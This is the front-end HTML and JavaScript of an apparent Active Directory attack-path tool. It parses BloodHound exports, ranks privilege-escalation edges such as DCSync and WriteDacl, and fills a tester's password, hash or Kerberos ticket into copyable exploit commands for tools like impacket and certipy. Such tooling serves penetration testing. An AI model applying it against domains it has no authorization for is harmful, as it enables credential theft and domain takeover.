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" style="width:160px;height:160px;border-radius:50%;border:2px solid var(--cyan);box-shadow:0 0 30px rgba(0,232,154,.4),0 0 60px rgba(0,232,154,.15)"></div>
        <div class="w-title">BLOODBOBER 🦫</div>
        <div class="w-sub">Load the BloodHound ZIP<br>Mark the owned accounts<br>Attack paths update immediately<br><span style="color:var(--cyan);font-size:.85em">🦫 Bober is watching...</span></div>
      </div>
    </div>
    <!-- Graph view — separate from scrollable content, full height -->
    <div id="graphView" style="display:none;flex:1;position:relative;overflow:hidden"></div>
  </main>
</div>

<!-- Edge tooltip — fixed, global -->
<div class="edge-tip" id="edgeTip"
     onmouseenter="edgeTipPinned=true; if(edgeTipTimer){clearTimeout(edgeTipTimer);edgeTipTimer=null;}"
     onmouseleave="edgeTipPinned=false">
  <div class="edge-tip-hdr">
    <span class="edge-tip-right" id="etRight"></span>
    <span style="font-size:.52em;color:var(--dim2);letter-spacing:1px">each block has its own ⎘ button</span>
  </div>
  <div class="edge-tip-body" id="etBody"></div>
</div>

<script>
// ── GRAPH STATE + CONSTANTS (toplevel so all code can access) ──
const G = {
  svg: null, root: null, zoom: null, sim: null,
  initialized: false, selNode: null,
  mode: 'smart', edgeLayer: 'all',
  edgeFilters: null, filterPanelOpen: false,
  infoExpanded: {},
  cycleIdx: -1, cycleTimer: null, lastAct: Date.now(),
};


const G_NODE_COLOR  = {User:'#00d4ff',Computer:'#ff7b2b',Group:'#c084fc',GPO:'#ff4fa3',Domain:'#1a5a3a',OU:'#42d392',Container:'#8aa4b8',Bucket:'#53606a',dc:'#ff2244',gmsa:'#ffd700'};
const G_NODE_STROKE = {User:'#007799',Computer:'#aa4400',Group:'#7744aa',GPO:'#aa2f6f',Domain:'#2a7050',OU:'#1f8f62',Container:'#526b7a',Bucket:'#7c8a95',dc:'#990011',gmsa:'#aa7700'};
const G_NODE_RADIUS = {User:13,Computer:15,Group:17,GPO:16,Domain:19,OU:16,Container:15,Bucket:16,dc:21,gmsa:12};
const G_NODE_ICON   = {User:'👤',Computer:'🖥',Group:'👥',GPO:'📜',Domain:'🌐',OU:'▣',Container:'⬚',Bucket:'⋯',dc:'🏴‍☠️',gmsa:'🔑'};
const G_SEV_COLOR   = {1:'#ff2244',2:'#ff7b2b',3:'#ffd700',4:'#00ff88'};
const G_SEV_MAP     = {GenericAll:1,DCSync:1,GetChangesAll:1,GetChanges:1,GetChangesInFilteredSet:2,WriteDacl:2,WriteOwner:2,Owns:2,AllExtendedRights:2,ForceChangePassword:3,GenericWrite:3,WriteSPN:3,WriteGPLink:3,AdminTo:3,CanRDP:3,CanPSRemote:3,ExecuteDCOM:3,SQLAdmin:3,ReadGMSAPassword:4,SyncLAPSPassword:4,AddKeyCredentialLink:3,WriteAccountRestrictions:3,AddAllowedToAct:3,AllowedToAct:3,AddMember:4,AddSelf:4,MemberOf:4,Contains:4,ReadLAPSPassword:4};
const G_SKIP_LABEL  = new Set(['MemberOf','Contains']);
const G_FILTER_DEFS = [
  {key:'memberof', label:'MemberOf'},
  {key:'contains', label:'Contains'},
  {key:'gplink', label:'GpLink'},
  {key:'critical', label:'Critical ACL'},
  {key:'write', label:'Write/Own/DCSync'},
  {key:'delegation', label:'Delegation'},
  {key:'remote', label:'Remote mgmt'},
  {key:'path', label:'Path edges'},
];
const G_WRITE_RIGHTS = new Set(['GenericAll','GenericWrite','WriteDacl','WriteOwner','Owns','AllExtendedRights','ForceChangePassword','WriteSPN','AddMember','AddSelf','AddKeyCredentialLink','DCSync','GetChanges','GetChangesAll','GetChangesInFilteredSet']);
const G_DELEG_RIGHTS = new Set(['AllowedToDelegate','AllowedToAct','AddAllowedToAct','WriteAccountRestrictions','WriteGPLink']);
const G_REMOTE_RIGHTS = new Set(['AdminTo','CanRDP','CanPSRemote','ExecuteDCOM','SQLAdmin']);
const G_SMART_NAME_RE = /(^|\b)(REMOTE MANAGEMENT USERS|REMOTE DESKTOP USERS|DISTRIBUTED COM USERS|WINRM|PSREMOTE|SQLADMIN|DNSADMINS|PROTECTED USERS|KEY ADMINS|GROUP POLICY CREATOR OWNERS)(\b|$)/i;

// ── STATE ──
let S = {
  domain: '', principals: [], graph: {}, stats: {},
  owned: new Set(), paths: [], currentTab: 'paths',
  pathFilter: 'all', pathSearch: '',
  overviewFocus: 'users',
  sidebarFilter: 'all',
  objectSearch: '',
};

// ── CONFIG STATE ──
let CFG = {
  dc_ip: '', dc_host: '', domain: '', user: '', pass: '',
  hash: '', ccache: '', target: '', proxy: '',
};
let CFG_AUTO = {
  dc_ip: '',
  domain: '',
};

// ── CONFIG FUNCTIONS ──
function toggleCfg() {
  const overlay = document.getElementById('cfgOverlay');
  const btn = document.getElementById('cfgBtn');
  const hidden = overlay.classList.toggle('hidden');
  btn.classList.toggle('active', !hidden);
}

function cfgChanged() {
  const fields = ['dc_ip','dc_host','domain','user','pass','hash','ccache','target','proxy'];
  fields.forEach(f => {
    const val = document.getElementById('cfg_' + f)?.value.trim();
    const ind = document.getElementById('ind_' + f);
    if (ind) ind.className = 'cfg-indicator' + (val ? ' set' : '');
  });
}

function applyConfig() {
  const fields = ['dc_ip','dc_host','domain','user','pass','hash','ccache','target','proxy'];
  fields.forEach(f => {
    CFG[f] = document.getElementById('cfg_' + f)?.value.trim() || '';
  });
  toggleCfg();
  // Re-render current tab so tips update
  renderCurrentTab();
}

function setAutoConfigField(field, nextValue) {
  if (!nextValue) return;
  const el = document.getElementById('cfg_' + field);
  const currentInput = el ? el.value.trim() : (CFG[field] || '');
  const prevAuto = CFG_AUTO[field] || '';
  const canReplace = !currentInput || currentInput === prevAuto;
  if (!canReplace) return;

  CFG[field] = nextValue;
  CFG_AUTO[field] = nextValue;
  if (el) el.value = nextValue;
  cfgChanged();
}

function autoFillConfig(domain) {
  // Called after ZIP upload — refresh auto-fill values but preserve manual edits
  if (domain && domain !== '?') {
    setAutoConfigField('domain', domain.toLowerCase());
  }
  // Try to parse DC IP from filename if stored
  if (S._filename) {
    const m = S._filename.match(/(\d{1,3}_\d{1,3}_\d{1,3}_\d{1,3})/);
    if (m) {
      const ip = m[1].replace(/_/g, '.');
      setAutoConfigField('dc_ip', ip);
    }
  }
}

// ── TIP PLACEHOLDER SUBSTITUTION ──
// Replaces DC_IP, domain.local, user, Pass etc. with actual CFG values
// Unknown/empty placeholders are left highlighted in orange
function fillTip(raw) {
  const subs = [
    // [placeholder regex, CFG key, fallback display]
    [/\bDC_IP\b/g,       'dc_ip',   'DC_IP'],
    [/\bDC_HOST\b/g,     'dc_host', 'DC_HOST'],
    [/\bDC_FQDN\b/g,     'dc_host', 'DC_FQDN'],
    [/\bdomain\.local\b/gi, 'domain', 'domain.local'],
    [/\bDOMAIN\.LOCAL\b/gi, 'domain', 'DOMAIN.LOCAL'],
    [/\bDOMAIN\b(?![\w.])/g, 'domain', 'DOMAIN'],
    [/\bTARGET_IP\b/g,   'target',  'TARGET_IP'],
    [/\bTARGET_HOST\b/g, 'target',  'TARGET_HOST'],
    [/\bTARGET\.domain\.local\b/gi, 'target', 'TARGET.domain.local'],
    [/\battacker\b/g,    'user',    'attacker'],
    [/(?<![A-Za-z0-9_])user(?![A-Za-z0-9_])/g, 'user', 'user'],
    [/(?<![A-Za-z0-9])Pass(?![A-Za-z0-9_])/g, 'pass', 'Pass'],
    [/\bPassword123!\b/g, 'pass',   'Password123!'],
    [/\bNTLM_HASH\b/g,   'hash',   'NTLM_HASH'],
    [/\bLMHASH:NTHASH\b/gi, 'hash', 'LMHASH:NTHASH'],
    [/\buser\.ccache\b/g, 'ccache', 'user.ccache'],
    [/\bKRBTGT_HASH\b/g, 'hash',   'KRBTGT_HASH'],
  ];

  // First escape HTML
  let result = raw
    .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');

  // Apply substitutions
  subs.forEach(([regex, cfgKey, placeholder]) => {
    const val = CFG[cfgKey];
    if (val) {
      result = result.replace(regex,
        `<span style="color:var(--green);font-weight:bold">${escHtml(val)}</span>`);
    } else {
      result = result.replace(regex,
        `<span class="cfg-ph">${placeholder}</span>`);
    }
  });

  // proxy prefix on command lines
  if (CFG.proxy) {
    // Lines starting with nxc, impacket-, bloodyAD, certipy, etc. get proxy prefix
    result = result.replace(/^(nxc |impacket-|bloodyAD |certipy |python3 |proxychains)/gm,
      `<span style="color:var(--purple)">${escHtml(CFG.proxy)} </span>$1`);
  }

  return result;
}
const SEV_MAP = {GenericAll:1,DCSync:2,GetChangesAll:2,GetChanges:2,GetChangesInFilteredSet:2,WriteDacl:3,WriteOwner:4,Owns:5,ForceChangePassword:6,GenericWrite:7,AllExtendedRights:8,WriteSPN:9,ReadGMSAPassword:10,SyncLAPSPassword:10,AddKeyCredentialLink:11,WriteAccountRestrictions:12,AddAllowedToAct:12,AllowedToAct:12,WriteGPLink:13,AddSelf:14,AddMember:15};
const RP_CLASSES = {GenericAll:'rp-GenericAll',DCSync:'rp-DCSync',GetChanges:'rp-GetChanges',GetChangesAll:'rp-GetChangesAll',GetChangesInFilteredSet:'rp-GetChangesInFilteredSet',WriteDacl:'rp-WriteDacl',WriteOwner:'rp-WriteOwner',Owns:'rp-Owns',AllExtendedRights:'rp-AllExtendedRights',ForceChangePassword:'rp-ForceChangePassword',AddMember:'rp-AddMember',GenericWrite:'rp-GenericWrite',WriteSPN:'rp-WriteSPN',WriteGPLink:'rp-WriteGPLink',ReadGMSAPassword:'rp-ReadGMSAPassword',SyncLAPSPassword:'rp-SyncLAPSPassword',WriteAccountRestrictions:'rp-WriteAccountRestrictions',AddAllowedToAct:'rp-AddAllowedToAct',AllowedToAct:'rp-AllowedToAct',AddKeyCredentialLink:'rp-AddKeyCredentialLink'};
const rp = r => `<span class="rp ${RP_CLASSES[r]||'rp-default'}">${r}</span>`;

// ── ZIP UPLOAD — drag & drop ──────────────────────────────────────────────
const dz = document.getElementById('dropzone');
let dragCounter = 0; // track nested dragenter/dragleave

dz.addEventListener('dragenter', e => {
  e.preventDefault(); e.stopPropagation();
  dragCounter++;
  dz.classList.add('drag-over');
});
dz.addEventListener('dragover', e => {
  e.preventDefault(); e.stopPropagation();
  dz.classList.add('drag-over');
});
dz.addEventListener('dragleave', e => {
  e.preventDefault(); e.stopPropagation();
  dragCounter--;
  if (dragCounter <= 0) { dragCounter = 0; dz.classList.remove('drag-over'); }
});
dz.addEventListener('drop', e => {
  e.preventDefault(); e.stopPropagation();
  dragCounter = 0; dz.classList.remove('drag-over');
  const f = e.dataTransfer.files[0];
  if (f) loadZip(f);
});

// document-level fallback — only when not dropped onto the dropzone
document.addEventListener('dragover', e => e.preventDefault());
document.addEventListener('drop', e => {
  e.preventDefault();
  // If the dropzone already handled it, do not run it twice
  if (e.target.closest('#dropzone')) return;
  const f = e.dataTransfer.files[0];
  if (f && f.name.toLowerCase().endsWith('.zip')) loadZip(f);
});

async function loadZip(file) {
  if (!file) return;
  if (!file.name.toLowerCase().endsWith('.zip')) {
    alert('Only .zip files are accepted!'); return;
  }
  S._filename = file.name;
  // Reset file input so the same file can be re-loaded
  const fi = document.getElementById('fi');
  if (fi) fi.value = '';

  showLoading('Parsing ' + file.name + '...');
  const fd = new FormData();
  fd.append('file', file);
  try {
    const r = await fetch('/api/upload', { method: 'POST', body: fd });
    if (!r.ok) {
      const txt = await r.text();
      alert('Server error ' + r.status + ': ' + txt.slice(0,200));
      return;
    }
    const d = await r.json();
    if (d.error) { alert('Parse error: ' + d.error); return; }
    S.domain = d.domain;
    S.principals = d.principals;
    S.graph = d.graph;
    S.stats = d.stats;
    S.owned = new Set();
    S.paths = [];
    G.initialized = false; // force graph redraw on next switch
    autoFillConfig(d.domain);
    document.getElementById('tabBar').style.display = 'flex';
    updateHeader();
    renderSidebar();
    renderCurrentTab();
  } catch(e) {
    alert('Connection error: ' + e.message + '\nIs the server running? (bloodbober)');
  }
}

async function recomputePaths() {
  if (!S.owned.size) { S.paths = []; return; }
  try {
    const r = await fetch('/api/paths', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ graph: S.graph, owned: [...S.owned] })
    });
    const d = await r.json();
    S.paths = d.paths || [];
    S.stats.paths = S.paths.length;
    updateHeader();
  } catch(e) { console.error(e); }
}

// ── UI ──
function updateHeader() {
  document.getElementById('hstats').innerHTML =
    `Domain: <b>${S.domain}</b> &nbsp;|&nbsp; Users: <b>${S.stats.users}</b> &nbsp;|&nbsp; Computers: <b>${S.stats.computers}</b> &nbsp;|&nbsp; Crit ACEs: <b>${S.stats.acls}</b>`;
}

function isSidebarInteresting(p) {
  return p.isDC || p.isGmsa || p.unconstrained || p.admincount || p.hasspn || p.dontreqpreauth || p.trustedtoauth;
}

function setSidebarFilter(filter) {
  S.sidebarFilter = filter;
  renderSidebar();
}

function renderSidebar() {
  const q = document.getElementById('sbSearch').value.toLowerCase();
  const cnt = S.owned.size;
  document.getElementById('ownedBadge').textContent = cnt ? `${cnt} owned` : '0 owned';
  document.getElementById('ownedBadge').className = 'badge' + (cnt ? ' warn' : '');
  document.querySelectorAll('.sb-filter').forEach(btn => {
    const txt = btn.textContent.trim().toLowerCase();
    const map = {all:'all', users:'users', computers:'computers', gmsa:'gmsa', interesting:'interesting', owned:'owned'};
    btn.classList.toggle('active', map[txt] === S.sidebarFilter);
  });

  const matchesFilter = p => {
    if (S.sidebarFilter === 'users') return p.type === 'User' && !p.isMachine;
    if (S.sidebarFilter === 'computers') return p.type === 'Computer';
    if (S.sidebarFilter === 'gmsa') return p.isGmsa;
    if (S.sidebarFilter === 'interesting') return isSidebarInteresting(p);
    if (S.sidebarFilter === 'owned') return S.owned.has(p.key);
    return true;
  };

  const sorted = [...S.principals]
    .filter(p => !q || p.name.toLowerCase().includes(q))
    .filter(matchesFilter)
    .sort((a,b) => {
      const ao = S.owned.has(a.key) ? 0 : 1;
      const bo = S.owned.has(b.key) ? 0 : 1;
      return ao !== bo ? ao - bo : a.name.localeCompare(b.name);
    });

  const items = sorted.map(p => {
    const owned = S.owned.has(p.key);
    const ico = p.isDC ? '🏴‍☠️' : p.isGmsa ? '🔑' : p.isMachine ? '🖥️' : p.type === 'Group' ? '👥' : '👤';
    const tags = [
      p.isDC ? '<span class="tag-sm t-dc">DC</span>' : '',
      p.isGmsa ? '<span class="tag-sm t-gmsa">gMSA</span>' : '',
      p.unconstrained ? '<span class="tag-sm t-dc">UNCON</span>' : '',
      p.admincount ? '<span class="tag-sm t-dc">Admin</span>' : '',
      (p.hasspn && !p.isMachine) ? '<span class="tag-sm t-spn">SPN</span>' : '',
      p.trustedtoauth ? '<span class="tag-sm t-t2a4d">T2A4D</span>' : '',
      p.dontreqpreauth ? '<span class="tag-sm t-asrep">ASREP</span>' : '',
    ].join('');
    return `<div class="ni ${owned?'owned':''} ${p.isDC?'is-dc':''}" onclick="toggleOwned('${p.key}')">
      <span class="ni-ico">${ico}</span>
      <span class="ni-label" title="${p.name}">${p.name.split('@')[0]}</span>
      ${tags}
      <span class="ni-type">${p.type}</span>
      <div class="ni-chk">${owned?'✓':''}</div>
    </div>`;
  }).join('');

  const label = S.sidebarFilter === 'all' ? 'starting points' : S.sidebarFilter;
  document.getElementById('nodeList').innerHTML = items || `<div style="padding:16px;text-align:center;color:var(--dim);font-size:.62em">No ${label} match</div>`;
}

async function toggleOwned(key) {
  if (S.owned.has(key)) S.owned.delete(key);
  else S.owned.add(key);
  renderSidebar();
  await recomputePaths();
  if (S.currentTab === 'paths') renderPathsTab();
  else if (S.currentTab === 'overview') renderOverviewTab();
  else if (S.currentTab === 'graph') renderGraphTab();
}

async function toggleGraphStartingPoint(key, event) {
  if (event) {
    event.preventDefault();
    event.stopPropagation();
  }
  await toggleOwned(key);
  const node = G.simNodes?.find(n => n.id === key) || G.allNById?.[key];
  if (node) showGInfo({...node, owned:S.owned.has(key)}, G.simLinks || []);
}

function switchTab(tab) {
  S.currentTab = tab;
  document.querySelectorAll('.tab').forEach((t,i) => {
    t.classList.toggle('active', ['paths','acls','deleg','overview','graph'][i] === tab);
  });
  // toggle content vs graph view
  const isGraph = tab === 'graph';
  document.getElementById('content').style.display   = isGraph ? 'none' : '';
  document.getElementById('graphView').style.display = isGraph ? 'flex' : 'none';
  updateObjectSearchVisibility();
  renderCurrentTab();
}

function updateObjectSearchVisibility() {
  const wrap = document.getElementById('objectSearchWrap');
  const input = document.getElementById('objectSearch');
  if (!wrap || !input) return;
  const visible = ['overview','graph'].includes(S.currentTab);
  wrap.classList.toggle('hidden', !visible);
  input.value = S.objectSearch || '';
}

function setObjectSearch(value) {
  S.objectSearch = value || '';
  if (S.currentTab === 'overview') renderOverviewDetail();
  else if (S.currentTab === 'graph') applyGraphSearch();
}

function clearObjectSearch() {
  S.objectSearch = '';
  const input = document.getElementById('objectSearch');
  if (input) input.value = '';
  if (S.currentTab === 'overview') renderOverviewDetail();
  else if (S.currentTab === 'graph') clearGraphSearchPreview();
}

function renderCurrentTab() {
  switch(S.currentTab) {
    case 'paths':    renderPathsTab(); break;
    case 'acls':     renderAclsTab(); break;
    case 'deleg':    renderDelegTab(); renderDelegExtra(); break;
    case 'overview': renderOverviewTab(); break;
    case 'graph':    renderGraphTab(); break;
  }
}

function renderPathsTab() {
  const c = document.getElementById('content');
  if (!S.owned.size) {
    c.innerHTML = `<div class="no-paths"><div style="font-size:2em;opacity:.35;margin-bottom:12px">🎯</div>Mark owned accounts in the left panel<br><span style="color:var(--dim);font-size:.9em">Attack paths appear immediately</span></div>`;
    return;
  }
  const paths = S.paths;
  const rights = [...new Set(paths.map(p=>p.right))].sort((a,b)=>(SEV_MAP[a]||99)-(SEV_MAP[b]||99));
  const filterBtns = rights.map(r=>`<button class="fbtn ${S.pathFilter===r?'active':''}" onclick="setPF('${r}')">${r}</button>`).join('');
  const filtered = paths.filter(p => {
    if (S.pathFilter !== 'all' && p.right !== S.pathFilter) return false;
    const q = S.pathSearch;
    if (q && !p.to.toLowerCase().includes(q) && !p.from.toLowerCase().includes(q) && !p.right.toLowerCase().includes(q)) return false;
    return true;
  });
  const cards = filtered.map(renderPathCard).join('');
  c.innerHTML = `<div class="sec">
    <div class="sec-title">Attack Paths <span class="cnt ${paths.length?'warn':''}">${paths.length}</span></div>
    <div class="path-filters">
      <input class="psearch" placeholder="// search..." value="${S.pathSearch}" oninput="setPS(this.value)">
      <button class="fbtn ${S.pathFilter==='all'?'active':''}" onclick="setPF('all')">ALL</button>
      ${filterBtns}
      <span style="margin-left:auto;font-size:.58em;color:var(--dim2)">${filtered.length} / ${paths.length}</span>
    </div>
    ${filtered.length ? cards : '<div class="no-paths">No results for the current filters</div>'}
  </div>`;
  document.querySelectorAll('.path-card').forEach(el => el.addEventListener('click', e => {
    if (e.target.closest('button, a, input, textarea, select')) return;
    el.classList.toggle('expanded');
  }));
}

function formatTip(right, raw) {
  // Split on SOURCE: line, extract source URL
  const srcMatch = raw.match(/SOURCE:\s*(https?:\/\/\S+)/);
  const srcUrl = srcMatch ? srcMatch[1] : null;
  let body = srcUrl ? raw.replace(/SOURCE:\s*https?:\/\/\S+/, '').trim() : raw.trim();

  // Split into sections: lines starting with # or === are headers, code lines go into <pre>
  const lines = body.split('\n');
  let html = '';
  let codeLines = [];
  let commentLines = [];

  function flushCode() {
    if (codeLines.length) {
      const id = 'pre_' + Math.random().toString(36).slice(2,8);
      html += `<div class="pre-wrap">
        <button class="copy-btn" onclick="copyPre('${id}', event)">⎘ copy</button>
        <pre id="${id}">${codeLines.map(l => fillTip(l)).join('\n')}</pre>
      </div>`;
      codeLines = [];
    }
  }
  function flushComment() {
    if (commentLines.length) {
      const txt = commentLines.join(' ').trim();
      if (txt) html += `<div style="color:var(--dim2);margin:4px 0 2px">${escHtml(txt)}</div>`;
      commentLines = [];
    }
  }

  for (const line of lines) {
    const t = line.trim();
    if (!t) { flushCode(); flushComment(); continue; }
    if (t.startsWith('===')) {
      flushCode(); flushComment();
      html += `<span class="tip-label">${escHtml(t.replace(/===/g,'').trim())}</span>`;
    } else if (t.startsWith('# ') || t.startsWith('// ')) {
      flushCode();
      commentLines.push(t);
    } else {
      flushComment();
      codeLines.push(line);
      // Flush after each line UNLESS it ends with \ (line continuation)
      if (!t.endsWith('\\')) flushCode();
    }
  }
  flushCode(); flushComment();

  const srcHtml = srcUrl ? `<div class="tip-src">📎 <a href="${srcUrl}" target="_blank">${escHtml(srcUrl)}</a></div>` : '';
  const labelByRight = {
    MemberOf: 'CONTEXT',
    Contains: 'CONTEXT',
    GpLink: 'CONTEXT',
    GetChanges: 'CONTEXT',
    GetChangesAll: 'CONTEXT',
    GetChangesInFilteredSet: 'CONTEXT',
    ProtectedGroup: 'CONSTRAINT',
    RemoteManagementUsers: 'ACCESS',
    PSNativeActions: 'WINRM',
    PSPowerViewActions: 'WINRM',
    PSRBCDPrep: 'WINRM',
    PSWinRMEnum: 'WINRM',
  };
  const label = labelByRight[right] || 'EXPLOIT';
  return `<div class="chain-tip"><span class="tip-label">// ${label} - ${escHtml(right)}</span>${html}${srcHtml}</div>`;
}

function escHtml(s) {
  s = String(s ?? '');
  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

function escAttr(s) {
  return escHtml(s).replace(/'/g,'&#39;');
}

// Copy plain text from a <pre> block (strips HTML tags / spans)
function copyPre(id, event) {
  if (event) {
    event.preventDefault();
    event.stopPropagation();
  }
  const pre = document.getElementById(id);
  if (!pre) return;
  // Extract plain text — strip all HTML tags
  const text = pre.innerText || pre.textContent;
  navigator.clipboard.writeText(text).then(() => {
    const btn = pre.parentElement.querySelector('.copy-btn');
    if (btn) {
      btn.textContent = '✓ copied';
      btn.classList.add('copied');
      setTimeout(() => { btn.textContent = '⎘ copy'; btn.classList.remove('copied'); }, 1800);
    }
  }).catch(() => {
    // Fallback for older browsers
    const ta = document.createElement('textarea');
    ta.value = pre.innerText;
    ta.style.position = 'fixed'; ta.style.opacity = '0';
    document.body.appendChild(ta); ta.select();
    document.execCommand('copy');
    document.body.removeChild(ta);
  });
}

// Process raw-text <pre> blocks that were inserted as static HTML (e.g. Delegation tab)
// Applies fillTip to each text line so placeholders get replaced + adds copy button
function postProcessPreBlocks(container) {
  container.querySelectorAll('.chain-tip pre').forEach(pre => {
    // Skip already processed (wrapped in .pre-wrap)
    if (pre.parentElement.classList.contains('pre-wrap')) return;

    const id = 'pre_' + Math.random().toString(36).slice(2,8);
    pre.id = id;

    // Apply fillTip line by line
    const lines = pre.textContent.split('\n');
    pre.innerHTML = lines.map(l => fillTip(l)).join('\n');

    // Wrap with copy button
    const wrap = document.createElement('div');
    wrap.className = 'pre-wrap';
    pre.parentNode.insertBefore(wrap, pre);
    wrap.appendChild(pre);
    const btn = document.createElement('button');
    btn.className = 'copy-btn';
    btn.textContent = '⎘ copy';
    btn.setAttribute('onclick', `copyPre('${id}', event)`);
    wrap.insertBefore(btn, pre);
  });
}

function renderPathCard(p) {
  const sev = Math.min(p.sev, 7);
  const via = p.via ? `<span class="ph-via">(via ${p.via})</span>` : '';
  const inh = p.inherited ? '<span class="ph-inh">inh</span>' : '';
  const chainHtml = p.chain.map((step, i) => {
    if (i === 0) {
      const isOwn = S.owned.has(step.name.toUpperCase().split('@')[0]);
      return `<div class="cs"><div class="cs-node ${isOwn?'owned':''}">▶ ${step.name.split('@')[0]}</div></div>`;
    }
    const rc2 = RP_CLASSES[step.right] || 'rp-default';
    const viaS = step.via ? ` <span style="color:var(--dim2)">(via ${step.via})</span>` : '';
    return `<div class="cs" style="padding-left:${(i-1)*14}px">
      <span style="color:var(--dim2)">└─</span>
      <span class="rp ${rc2}" style="font-size:.72em">${step.right}</span>${viaS}
      <span style="color:var(--dim2)">──▶</span>
      <div class="cs-node">${step.name.split('@')[0]}</div>
    </div>`;
  }).join('');
  const tip = p.tip ? formatTip(p.right, p.tip) : '';
  return `<div class="path-card" data-sev="${sev}">
    <div class="ph">
      <span class="ph-from">${p.from.split('@')[0]}</span>
      <span class="ph-arr">──</span>
      ${rp(p.right)}
      <span class="ph-arr">──▶</span>
      <span class="ph-to">${p.to.split('@')[0]}</span>
      ${via} ${inh}
      <span class="ph-dep">d${p.depth}</span>
    </div>
    <div class="pchain"><div class="chain-steps">${chainHtml}</div>${tip}</div>
  </div>`;
}

function setPF(f) { S.pathFilter = f; renderPathsTab(); }
function setPS(v) { S.pathSearch = v.toLowerCase(); renderPathsTab(); }

